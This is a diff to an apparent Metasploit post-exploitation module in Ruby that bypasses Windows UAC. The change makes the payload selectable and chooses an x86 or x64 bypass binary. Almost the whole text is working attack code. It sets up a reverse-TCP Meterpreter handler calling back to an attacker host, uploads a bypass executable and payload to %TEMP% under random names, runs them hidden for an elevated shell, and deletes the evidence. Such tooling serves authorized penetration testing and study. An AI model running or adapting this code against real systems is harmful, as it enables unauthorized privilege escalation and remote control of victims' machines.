@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 			'Name'          => 'Windows UAC Protection Bypass',
-			'Description'   => %q{ 
+			'Description'   => %q{
 				This module will bypass Windows UAC by utilizing the trusted publisher
 				certificate through process injection. It will spawn a second shell that
 				has the UAC flag turned off.
@@ -57,17 +57,18 @@ class Metasploit3 < Msf::Post
 
 		lhost = datastore["LHOST"] || Rex::Socket.source_address
 		lport = datastore["LPORT"] || 4444
+		payload = datastore['PAYLOAD'] || "windows/meterpreter/reverse_tcp"
 
 		# create a session handler
 		handler = session.framework.exploits.create("multi/handler")
-		handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
+		handler.datastore['PAYLOAD'] = payload
 		handler.datastore['LHOST']   = lhost
 		handler.datastore['LPORT']   = lport
 		handler.datastore['InitialAutoRunScript'] = "migrate -f"
 		handler.datastore['ExitOnSession'] = true
-		
+
 		# start the session handler
-		
+
 		#handler.exploit_module = self
 		handler.exploit_simple(
 			'LocalInput'  => self.user_input,
@@ -82,33 +83,41 @@ class Metasploit3 < Msf::Post
 
 		# randomize the filename
 		filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
-		
+
 		# randomize the exe name
 		tempexe_name = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
-		
+
 		# path to the bypassuac binary
 		path = ::File.join(Msf::Config.install_root, "data", "post")
-		
+
+		# decide, x86 or x64
+		bpexe = nil
+		if payload =~ /x64/
+			bpexe = ::File.join(path, "bypassuac-x64.exe")
+		else
+			bpexe = ::File.join(path, "bypassuac-x86.exe")
+		end
+
 		# generate a payload
-		pay = session.framework.payloads.create("windows/meterpreter/reverse_tcp")
+		pay = session.framework.payloads.create(payload)
 		pay.datastore['LHOST'] = lhost
 		pay.datastore['LPORT'] = lport
-		
+
 		raw = pay.generate
-		
+
 		exe = Msf::Util::EXE.to_win32pe(session.framework, raw)
-		
+
 		sysdir = session.fs.file.expand_path("%SystemRoot%")
 		tmpdir = session.fs.file.expand_path("%TEMP%")
-		cmd = "#{tmpdir}\\#{filename} /c %TEMP%\\"+"#{tempexe_name}"
-		
+		cmd = "#{tmpdir}\\#{filename} /c %TEMP%\\#{tempexe_name}"
+
 		print_status("Uploading the bypass UAC executable to the filesystem...")
-		
+
 		begin
 			#
 			# Upload UAC bypass to the filesystem
 			#
-			session.fs.file.upload_file("%TEMP%\\#{filename}", ::File.join(path, "bypassuac.exe"))
+			session.fs.file.upload_file("%TEMP%\\#{filename}", bpexe)
 			print_status("Meterpreter stager executable #{exe.length} bytes long being uploaded..")
 			#
 			# Upload the payload to the filesystem
@@ -118,18 +127,18 @@ class Metasploit3 < Msf::Post
 			fd.write(exe)
 			fd.close
 		rescue ::Exception => e
-			print_error("Error uploading file #{upload_fn}: #{e.class} #{e}")
+			print_error("Error uploading file #{filename}: #{e.class} #{e}")
 			return
 		end
-		
+
 		print_status("Uploaded the agent to the filesystem....")
-		
+
 		# execute the payload
 		session.sys.process.execute(cmd, nil, {'Hidden' => true})
-		
+
 		# delete the uac bypass payload
 		delete_file = "cmd.exe /c del #{tmpdir}\\#{filename}"
-		
+
 		session.sys.process.execute(delete_file, nil, {'Hidden' => true})
 	end
 
